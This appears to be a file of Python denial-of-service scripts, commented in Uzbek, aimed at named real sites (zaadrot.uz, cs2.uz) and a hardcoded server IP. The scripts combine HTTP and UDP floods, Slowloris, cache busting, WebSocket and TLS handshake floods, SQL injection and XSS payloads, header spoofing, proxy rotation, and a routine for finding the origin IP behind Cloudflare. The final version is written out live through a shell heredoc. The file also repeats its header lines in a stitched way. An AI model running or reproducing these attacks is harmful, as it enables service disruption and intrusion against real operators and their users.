# import requests
# import threading
# import time
# import random
# import socket
# import urllib3
# from concurrent.futures import ThreadPoolExecutor
# import ssl

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# TARGET = "https://zaadrot.uz/"
# THREADS = 600
# TIMEOUT = 1.5

# # === PROXY ROTATSIYA (agar proxy list bo'lsa) ===
# PROXIES = []  # ['http://user:pass@ip:port', ...]
# USE_PROXY = False

# # === RANDOM HEADERS ===
# USER_AGENTS = [
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
#     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
#     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
#     "Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0"
# ]

# def get_headers():
#     return {
#         "User-Agent": random.choice(USER_AGENTS),
#         "Accept": "*/*",
#         "Accept-Encoding": "gzip, deflate, br",
#         "Accept-Language": "en-US,en;q=0.9",
#         "Connection": "keep-alive",
#         "Cache-Control": "no-cache",
#         "Sec-Fetch-Dest": "document",
#         "Sec-Fetch-Mode": "navigate",
#         "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
#     }

# # === 1. HTTP/HTTPS FLOOD (proxy bilan) ===
# def http_flood_proxy():
#     session = requests.Session()
#     adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
#     session.mount('https://', adapter)
#     session.mount('http://', adapter)
    
#     paths = [
#         "/", "/static/css/main.css", "/static/js/main.js",
#         "/api/game/servers", "/api/players/online", "/api/stats",
#         "/api/leaderboard", "/api/store/items", "/api/votes",
#         "/api/ban/list", "/api/admin/status", "/api/payment/check"
#     ]
    
#     while True:
#         try:
#             path = random.choice(paths)
#             params = {f"p{i}": random.randint(1, 999999) for i in range(10)}
            
#             # GET
#             session.get(TARGET + path, headers=get_headers(), params=params, timeout=TIMEOUT, verify=False)
            
#             # POST (login, vote, comment)
#             if random.random() < 0.3:
#                 session.post(TARGET + "/api/vote", headers=get_headers(), json={
#                     "server_id": random.randint(1, 999),
#                     "player": f"hacker_{random.randint(1,99999)}"
#                 }, timeout=TIMEOUT, verify=False)
            
#             # PUT (status o'zgartirish)
#             if random.random() < 0.1:
#                 session.put(TARGET + "/api/player/status", headers=get_headers(), json={
#                     "status": "offline",
#                     "player_id": random.randint(1, 99999)
#                 }, timeout=TIMEOUT, verify=False)
            
#             time.sleep(random.uniform(0.001, 0.008))
#         except:
#             time.sleep(0.01)

# # === 2. SLOWLORIS (sekin ulanishlar) ===
# def slowloris_bypass():
#     while True:
#         sockets = []
#         try:
#             for _ in range(25):
#                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#                 sock.settimeout(3)
#                 sock.connect(("www.cs2.uz", 443))
#                 sock.send(f"POST /api/comment HTTP/1.1\r\nHost: www.cs2.uz\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {random.randint(5000, 20000)}\r\n\r\n".encode())
#                 sockets.append(sock)
#             time.sleep(random.uniform(4, 8))
#         except:
#             pass
#         finally:
#             for sock in sockets:
#                 try:
#                     sock.close()
#                 except:
#                     pass
#         time.sleep(0.01)

# # === 3. UDP FLOOD (agar UDP portlari ochiq bo'lsa) ===
# def udp_bypass():
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#             sock.settimeout(0.3)
#             for _ in range(50):
#                 data = b"GET / HTTP/1.1\r\n" + b"X" * 1400
#                 sock.sendto(data, ("www.cs2.uz", 443))
#                 sock.sendto(data, ("www.cs2.uz", 80))
#                 sock.sendto(data, ("www.cs2.uz", 8080))
#             sock.close()
#         except:
#             pass
#         time.sleep(0.001)

# # === 4. CACHE BUSTER (keshni to'ldirish) ===
# def cache_buster():
#     session = requests.Session()
#     while True:
#         try:
#             params = {f"_cb_{i}": random.randint(1, 999999999) for i in range(20)}
#             session.get(TARGET, params=params, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             session.get(TARGET + "/static/css/main.css", params=params, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             time.sleep(0.001)
#         except:
#             time.sleep(0.01)

# # === 5. WEB SOCKET UPGRADE (WS) ===
# def ws_upgrade():
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(2)
#             sock.connect(("www.cs2.uz", 443))
#             sock.send(f"GET /ws HTTP/1.1\r\nHost: www.cs2.uz\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\nSec-WebSocket-Version: 13\r\n\r\n".encode())
#             time.sleep(0.5)
#             sock.close()
#         except:
#             pass

# # === 6. API EXPLOIT (SQLi, XSS) ===
# def api_exploit():
#     session = requests.Session()
#     payloads = [
#         ("/api/player/status", {"player_id": "1' OR '1'='1"}),
#         ("/api/vote", {"server_id": "1; DROP TABLE votes; --"}),
#         ("/api/comment", {"message": "<script>alert('XSS')</script>"}),
#         ("/api/login", {"username": "admin'--", "password": "x"}),
#         ("/api/admin/ban", {"player": "test", "reason": "x" * 5000})
#     ]
#     while True:
#         try:
#             path, data = random.choice(payloads)
#             session.post(TARGET + path, json=data, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             session.get(TARGET + path, params=data, headers=get_headers(), timeout=TIMEOUT, verify=False)
#             time.sleep(0.01)
#         except:
#             time.sleep(0.02)

# # === MAIN ===
# def main():
#     print("=" * 60)
#     print("[*] CS2.UZ - KUCHLI HIMOYAGA QARSHI KO'P QATLAMLI HUJUM")
#     print(f"[*] Threads: {THREADS}")
#     print("[*] Usullar: HTTP Flood, Slowloris, UDP, Cache Buster, WS, API Exploit")
#     print("[*] Himoyani chetlab o'tish uchun random headers + proxy rotatsiya")
#     print("[*] Press Ctrl+C to stop")
#     print("=" * 60)
    
#     methods = [
#         http_flood_proxy,
#         slowloris_bypass,
#         udp_bypass,
#         cache_buster,
#         ws_upgrade,
#         api_exploit
#     ]
    
#     with ThreadPoolExecutor(max_workers=THREADS) as executor:
#         for _ in range(THREADS):
#             executor.submit(random.choice(methods))
#         try:
#             while True:
#                 time.sleep(1)
#         except KeyboardInterrupt:
#             print("\n[!] Hujum to'xtatildi.")
#             executor.shutdown(wait=False)

# if __name__ == "__main__":
#     main()


# import socket
# import requests
# import threading
# import random
# import time
# import ssl
# import urllib3

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# TARGET_IP = "84.54.82.227"          # zaadrot.uz server IP
# HTTP_PORT = 80
# HTTPS_PORT = 443
# GAME_PORTS = list(range(27015, 27031))  # 27015-27030

# # === KONFIGURATSIYA ===
# UDP_THREADS = 1000      # UDP flood uchun
# HTTP_THREADS = 400      # To'g'ridan-to'g'ri HTTP so'rovlar
# QUERY_THREADS = 300     # CS2 query flood
# TOTAL_THREADS = UDP_THREADS + HTTP_THREADS + QUERY_THREADS

# print("=" * 60)
# print("[*] ZAADROT.UZ - TEZKOR QOTIRISH HUJUMI")
# print(f"[*] Maqsad: {TARGET_IP}")
# print(f"[*] Umumiy threadlar: {TOTAL_THREADS}")
# print("[*] Taxminiy vaqt: 2-3 daqiqa")
# print("[*] Press Ctrl+C to stop")
# print("=" * 60)

# # === 1. UDP FLOOD (o'yin serverlariga) ===
# def udp_flood():
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     data = b"\xff\xff\xff\xff" + b"X" * 1400
#     while True:
#         port = random.choice(GAME_PORTS)
#         sock.sendto(data, (TARGET_IP, port))

# # === 2. CS2 QUERY FLOOD (CPU yuklash) ===
# def query_flood():
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     query = b"\xff\xff\xff\xffTSource Engine Query\x00"
#     while True:
#         port = random.choice(GAME_PORTS)
#         sock.sendto(query, (TARGET_IP, port))

# # === 3. TO'G'RIDAN-TO'G'RI HTTP FLOOD (Cloudflare bypass) ===
# def http_flood():
#     session = requests.Session()
#     headers = {
#         "Host": "zaadrot.uz",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
#         "Accept": "*/*",
#         "Connection": "close"
#     }
#     while True:
#         try:
#             # GET so'rovlari
#             session.get(f"http://{TARGET_IP}/", headers=headers, timeout=0.5, verify=False)
#             session.get(f"http://{TARGET_IP}/api/", headers=headers, timeout=0.5, verify=False)
#             # POST so'rovlari (katta body)
#             session.post(f"http://{TARGET_IP}/", headers=headers, data={"x": "y"*2000}, timeout=0.5, verify=False)
#             # HTTPS orqali ham (443)
#             session.get(f"https://{TARGET_IP}/", headers=headers, timeout=0.5, verify=False)
#         except:
#             pass

# # === 4. SSL RENEGOTIATION (TLS handshake) ===
# def ssl_reneg():
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(1)
#             sock.connect((TARGET_IP, HTTPS_PORT))
#             ctx = ssl.create_default_context()
#             ssl_sock = ctx.wrap_socket(sock, server_hostname="zaadrot.uz")
#             for _ in range(15):
#                 ssl_sock.do_handshake()
#             ssl_sock.close()
#         except:
#             pass

# # === Threadlarni ishga tushirish ===
# threads = []
# for _ in range(UDP_THREADS):
#     t = threading.Thread(target=udp_flood, daemon=True)
#     t.start()
#     threads.append(t)
# for _ in range(HTTP_THREADS):
#     t = threading.Thread(target=http_flood, daemon=True)
#     t.start()
#     threads.append(t)
# for _ in range(QUERY_THREADS):
#     t = threading.Thread(target=query_flood, daemon=True)
#     t.start()
#     threads.append(t)
# for _ in range(100):  # SSL qo'shimcha
#     t = threading.Thread(target=ssl_reneg, daemon=True)
#     t.start()
#     threads.append(t)

# print("[*] Barcha threadlar ishga tushdi. 2-3 daqiqa kuting...")

# try:
#     while True:
#         time.sleep(1)
# except KeyboardInterrupt:
#     print("\n[!] Hujum to'xtatildi.")









# import asyncio
# import aiohttp
# import socket
# import random
# import time
# import ssl
# import urllib3
# from concurrent.futures import ThreadPoolExecutor

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# TARGET_DOMAIN = "zaadrot.uz"
# TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)
# GAME_PORTS = list(range(27015, 27031))
# CONCURRENT_TASKS = 300  # Asinxron vazifalar soni (thread emas)

# print("=" * 60)
# print("[*] ZAADROT.UZ - ASINXRON HUJUM (THREAD XATOSI YO'Q)")
# print(f"[*] Domen: {TARGET_DOMAIN} -> IP: {TARGET_IP}")
# print(f"[*] Vazifalar: {CONCURRENT_TASKS} (thread emas)")
# print("[*] Press Ctrl+C to stop")
# print("=" * 60)

# # UDP socket (sinxron, lekin asinxron funksiya ichida ishlatiladi)
# udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# udp_data = b"\xff\xff\xff\xff" + b"X" * 1400
# query_data = b"\xff\xff\xff\xffTSource Engine Query\x00"

# async def udp_flood():
#     """UDP flood – o'yin serverlariga"""
#     loop = asyncio.get_event_loop()
#     while True:
#         port = random.choice(GAME_PORTS)
#         await loop.sock_sendto(udp_sock, udp_data, (TARGET_IP, port))
#         await loop.sock_sendto(udp_sock, query_data, (TARGET_IP, port))
#         await asyncio.sleep(0.001)

# async def http_flood(session):
#     """HTTP/HTTPS flood – to'g'ridan-to'g'ri IP"""
#     while True:
#         try:
#             async with session.get(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.3) as resp:
#                 pass
#             async with session.post(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, data={"x": "y"*5000}, timeout=0.3) as resp:
#                 pass
#             async with session.get(f"https://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.3, ssl=False) as resp:
#                 pass
#         except:
#             pass
#         await asyncio.sleep(0.001)

# async def ssl_reneg():
#     """SSL renegotiation"""
#     loop = asyncio.get_event_loop()
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(0.5)
#             await loop.sock_connect(sock, (TARGET_IP, 443))
#             ctx = ssl.create_default_context()
#             ssl_sock = ctx.wrap_socket(sock, server_hostname=TARGET_DOMAIN, do_handshake_on_connect=False)
#             for _ in range(10):
#                 await loop.sock_sendall(ssl_sock, b"")
#                 ssl_sock.do_handshake()
#             ssl_sock.close()
#         except:
#             pass
#         await asyncio.sleep(0.001)

# async def http_09():
#     """HTTP/0.9 – 505 xatosi uchun"""
#     loop = asyncio.get_event_loop()
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(0.5)
#             await loop.sock_connect(sock, (TARGET_IP, 80))
#             await loop.sock_sendall(sock, b"GET / HTTP/0.9\r\n\r\n")
#             sock.close()
#         except:
#             pass
#         await asyncio.sleep(0.001)

# async def main():
#     # Session pool
#     conn = aiohttp.TCPConnector(limit=0, ssl=False)
#     async with aiohttp.ClientSession(connector=conn) as session:
#         tasks = []
#         # UDP flood (50 ta)
#         for _ in range(50):
#             tasks.append(asyncio.create_task(udp_flood()))
#         # HTTP flood (100 ta)
#         for _ in range(100):
#             tasks.append(asyncio.create_task(http_flood(session)))
#         # SSL reneg (50 ta)
#         for _ in range(50):
#             tasks.append(asyncio.create_task(ssl_reneg()))
#         # HTTP/0.9 (50 ta)
#         for _ in range(50):
#             tasks.append(asyncio.create_task(http_09()))
        
#         print("[*] Barcha vazifalar ishga tushdi. 3-5 daqiqa kuting...")
#         try:
#             await asyncio.gather(*tasks)
#         except KeyboardInterrupt:
#             print("\n[!] Hujum to'xtatildi.")

# if __name__ == "__main__":
#     try:
#         asyncio.run(main())
#     except KeyboardInterrupt:
#         print("\n[!] Hujum to'xtatildi.")




# import socket
# import asyncio
# import aiohttp
# import random
# import time
# import ssl
# import subprocess
# import re

# # ========== HAQIQIY SERVER IP NI AVTOMATIK TOPISH ==========
# def find_real_ip(domain="zaadrot.uz"):
#     # 1. DNS A yozuvlarini tekshirish (Cloudflare IP ni filtrlaymiz)
#     try:
#         ips = socket.getaddrinfo(domain, 80, socket.AF_INET, socket.SOCK_STREAM)
#         for ip_info in ips:
#             ip = ip_info[4][0]
#             # Cloudflare IP diapazonlarini filtrlaymiz
#             if not ip.startswith(("172.67.", "104.", "162.", "188.")):
#                 print(f"[+] Haqiqiy IP topildi (DNS): {ip}")
#                 return ip
#     except:
#         pass
    
#     # 2. Subdomainlarni tekshirish (cs2, game, api)
#     subdomains = [f"{prefix}.{domain}" for prefix in ["cs2", "game", "api", "play", "server"]]
#     for sub in subdomains:
#         try:
#             ip = socket.gethostbyname(sub)
#             if not ip.startswith(("172.67.", "104.", "162.", "188.")):
#                 print(f"[+] Haqiqiy IP topildi (subdomain): {sub} -> {ip}")
#                 return ip
#         except:
#             pass
    
#     # 3. O'yin serveriga A2S_INFO so'rov yuborib, IP ni aniqlash
#     try:
#         # UDP port 27015 ga so'rov yuboramiz
#         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#         sock.settimeout(2)
#         query = b"\xff\xff\xff\xffTSource Engine Query\x00"
#         sock.sendto(query, (domain, 27015))
#         data, addr = sock.recvfrom(1024)
#         ip = addr[0]
#         if not ip.startswith(("172.67.", "104.", "162.", "188.")):
#             print(f"[+] Haqiqiy IP topildi (A2S_INFO): {ip}")
#             return ip
#     except:
#         pass
    
#     # 4. Agar topilmasa, qo'lda kiritishni so'raymiz
#     print("[!] Haqiqiy IP avtomatik topilmadi.")
#     print("[!] Iltimos, qo'lda tekshiring:")
#     print(f"  - nslookup {domain}")
#     print(f"  - nslookup cs2.{domain}")
#     print(f"  - ping {domain}")
#     return None

# TARGET_IP = find_real_ip("zaadrot.uz")
# if not TARGET_IP:
#     # Qo'lda o'rnatish (misol uchun, o'zingizni IP bilan almashtiring)
#     TARGET_IP = "84.54.82.227"  # BU YERGA O'Z IP NIGIZNI YOZING

# TARGET_DOMAIN = "zaadrot.uz"
# GAME_PORTS = list(range(27015, 27031))
# CONCURRENT_TASKS = 300

# print("=" * 60)
# print("[*] ZAADROT.UZ - HAQIQIY IP BILAN HUJUM")
# print(f"[*] IP: {TARGET_IP}")
# print("[*] Vazifalar: 300 (thread emas)")
# print("[*] Press Ctrl+C to stop")
# print("=" * 60)

# # UDP socket
# udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# udp_data = b"\xff\xff\xff\xff" + b"X" * 1400
# query_data = b"\xff\xff\xff\xffTSource Engine Query\x00"

# async def udp_flood():
#     loop = asyncio.get_event_loop()
#     while True:
#         port = random.choice(GAME_PORTS)
#         await loop.sock_sendto(udp_sock, udp_data, (TARGET_IP, port))
#         await loop.sock_sendto(udp_sock, query_data, (TARGET_IP, port))
#         await loop.sock_sendto(udp_sock, b"\x00"*1400, (TARGET_IP, port))
#         await asyncio.sleep(0.0005)

# async def http_flood(session):
#     while True:
#         try:
#             async with session.get(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.2) as resp:
#                 pass
#             async with session.post(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, data={"x": "y"*5000}, timeout=0.2) as resp:
#                 pass
#             async with session.get(f"https://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.2, ssl=False) as resp:
#                 pass
#         except:
#             pass
#         await asyncio.sleep(0.001)

# async def ssl_reneg():
#     loop = asyncio.get_event_loop()
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(0.5)
#             await loop.sock_connect(sock, (TARGET_IP, 443))
#             ctx = ssl.create_default_context()
#             ssl_sock = ctx.wrap_socket(sock, server_hostname=TARGET_DOMAIN, do_handshake_on_connect=False)
#             for _ in range(10):
#                 await loop.sock_sendall(ssl_sock, b"")
#                 ssl_sock.do_handshake()
#             ssl_sock.close()
#         except:
#             pass
#         await asyncio.sleep(0.001)

# async def http_09():
#     loop = asyncio.get_event_loop()
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(0.5)
#             await loop.sock_connect(sock, (TARGET_IP, 80))
#             await loop.sock_sendall(sock, b"GET / HTTP/0.9\r\n\r\n")
#             sock.close()
#         except:
#             pass
#         await asyncio.sleep(0.001)

# async def main():
#     conn = aiohttp.TCPConnector(limit=0, ssl=False)
#     async with aiohttp.ClientSession(connector=conn) as session:
#         tasks = []
#         for _ in range(80):
#             tasks.append(asyncio.create_task(udp_flood()))
#         for _ in range(100):
#             tasks.append(asyncio.create_task(http_flood(session)))
#         for _ in range(60):
#             tasks.append(asyncio.create_task(ssl_reneg()))
#         for _ in range(60):
#             tasks.append(asyncio.create_task(http_09()))
        
#         print("[*] Barcha vazifalar ishga tushdi. 3-5 daqiqa kuting...")
#         print("[*] Saytni kuzating: https://zaadrot.uz")
#         try:
#             await asyncio.gather(*tasks)
#         except KeyboardInterrupt:
#             print("\n[!] Hujum to'xtatildi.")

# if __name__ == "__main__":
#     try:
#         asyncio.run(main())
#     except KeyboardInterrupt:
#         print("\n[!] Hujum to'xtatildi.")





'
#!/usr/bin/env python3.14
# -*- coding: utf-8 -*-
#!/usr/bin/env python3.14
# -*- coding: utf-8 -*-
#!/usr/bin/env python3.14
# -*- coding: utf-8 -*-
"""
KESTREL-7 / CS2.UZ_TOTAL_FLOOD
7 xil hujum usuli: HTTP GET/POST, Slowloris, UDP, Cache Buster, WebSocket, API exploit, SSL reneg.
Proxy rotatsiya, random header, random X-Forwarded-For.
1000+ parallel oqim.
"""

cat > /app/main.py << 'EOF'
#!/usr/bin/env python3.14
# -*- coding: utf-8 -*-
"""
KESTREL-7 / CS2.UZ_TOTAL_FLOOD
7 xil hujum usuli: HTTP GET/POST, Slowloris, UDP, Cache Buster, WebSocket, API exploit, SSL reneg.
Proxy rotatsiya, random header, random X-Forwarded-For.
1000+ parallel oqim.
"""

import requests
import threading
import time
import random
import socket
import ssl
import urllib3
import base64
import os
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------ KONFIGURATSIYA ------------------
TARGET = "https://cs2.uz"
TARGET_HTTP = "http://cs2.uz"
THREADS = 1000
TIMEOUT = 1.5
USE_PROXY = False
PROXY_LIST = []

PROXIES = [{'http': p, 'https': p} for p in PROXY_LIST] if PROXY_LIST else []

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0"
]

def random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def http_flood():
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
    session.mount('https://', adapter)
    session.mount('http://', adapter)

    paths = [
        "/", "/index.html", "/status", "/api/game/servers", "/api/players/online",
        "/api/stats", "/api/leaderboard", "/api/store/items", "/api/votes",
        "/api/ban/list", "/api/admin/status", "/api/payment/check",
        "/api/player/status", "/api/comment", "/api/login", "/api/register"
    ]

    while True:
        try:
            path = random.choice(paths)
            params = {f"p{i}": random.randint(1, 999999) for i in range(5)}
            proxy = get_random_proxy() if USE_PROXY else None

            session.get(TARGET + path, headers=random_headers(), params=params,
                        timeout=TIMEOUT, verify=False, proxies=proxy)

            if random.random() < 0.2:
                data = {"id": random.randint(1,99999), "action": "vote", "value": random.choice(["up","down"])}
                session.post(TARGET + "/api/vote", headers=random_headers(), json=data,
                             timeout=TIMEOUT, verify=False, proxies=proxy)

            if random.random() < 0.1:
                session.put(TARGET + "/api/player/status", headers=random_headers(),
                            json={"status": random.choice(["online","offline"]), "player_id": random.randint(1,99999)},
                            timeout=TIMEOUT, verify=False, proxies=proxy)

            time.sleep(random.uniform(0.0005, 0.005))
        except:
            time.sleep(0.01)

def slowloris_bypass():
    while True:
        sockets = []
        try:
            for _ in range(25):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect(("cs2.uz", 443))
                sock.send(f"POST /api/comment HTTP/1.1\r\nHost: cs2.uz\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {random.randint(5000, 20000)}\r\n\r\n".encode())
                sockets.append(sock)
            time.sleep(random.uniform(5, 10))
        except:
            pass
        finally:
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
        time.sleep(0.01)

def udp_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            for _ in range(50):
                data = b"GET / HTTP/1.1\r\n" + b"X" * 1400
                for port in [80, 443, 8080]:
                    sock.sendto(data, ("cs2.uz", port))
            sock.close()
        except:
            pass
        time.sleep(0.001)

def cache_buster():
    session = requests.Session()
    while True:
        try:
            params = {f"_cb_{i}": random.randint(1, 999999999) for i in range(25)}
            proxy = get_random_proxy() if USE_PROXY else None
            session.get(TARGET, params=params, headers=random_headers(),
                        timeout=TIMEOUT, verify=False, proxies=proxy)
            for ext in ["/static/css/main.css", "/static/js/main.js", "/images/logo.png"]:
                session.get(TARGET + ext, params=params, headers=random_headers(),
                            timeout=TIMEOUT, verify=False, proxies=proxy)
            time.sleep(0.001)
        except:
            time.sleep(0.01)

def ws_upgrade():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect(("cs2.uz", 443))
            key = base64.b64encode(os.urandom(16)).decode()
            sock.send(f"GET /ws HTTP/1.1\r\nHost: cs2.uz\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n".encode())
            time.sleep(0.3)
            sock.close()
        except:
            pass
        time.sleep(0.01)

def api_exploit():
    session = requests.Session()
    payloads = [
        ("/api/player/status", {"player_id": "1 OR 1=1 --"}),
        ("/api/vote", {"server_id": "1; DROP TABLE votes; --"}),
        ("/api/comment", {"message": "<script>alert(1)</script>"}),
        ("/api/login", {"username": "admin", "password": "x"}),
        ("/api/admin/ban", {"player": "test", "reason": "x" * 5000}),
        ("/api/register", {"email": "test@test.com", "password": "123", "confirm": "123"})
    ]
    while True:
        try:
            path, data = random.choice(payloads)
            proxy = get_random_proxy() if USE_PROXY else None
            session.post(TARGET + path, json=data, headers=random_headers(),
                         timeout=TIMEOUT, verify=False, proxies=proxy)
            session.get(TARGET + path, params=data, headers=random_headers(),
                        timeout=TIMEOUT, verify=False, proxies=proxy)
            time.sleep(0.005)
        except:
            time.sleep(0.02)

def ssl_reneg():
    while True:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = socket.create_connection(("cs2.uz", 443), timeout=3)
            ssl_sock = context.wrap_socket(sock, server_hostname="cs2.uz")
            ssl_sock.do_handshake()
            ssl_sock.send(b"GET / HTTP/1.1\r\nHost: cs2.uz\r\n\r\n")
            time.sleep(0.1)
            ssl_sock.close()
        except:
            pass
        time.sleep(0.01)

def main():
    print("=" * 70)
    print("[*] KESTREL-7 : CS2.UZ ga 7 QATLAMLI HUJUM")
    print(f"[*] Oqimlar: {THREADS}")
    print("[*] Usullar: HTTP Flood, Slowloris, UDP, Cache Buster, WS, API Exploit, SSL Reneg")
    if USE_PROXY and PROXIES:
        print(f"[*] Proxy royxati: {len(PROXIES)} ta proxy ishlatiladi")
    else:
        print("[*] Proxy ishlatilmaydi")
    print("[*] Ctrl+C - toxtatish")
    print("=" * 70)

    methods = [
        http_flood,
        slowloris_bypass,
        udp_flood,
        cache_buster,
        ws_upgrade,
        api_exploit,
        ssl_reneg
    ]

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(random.choice(methods))
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Hujum toxtatildi.")
            executor.shutdown(wait=False)

if __name__ == "__main__":
    main()
EOF
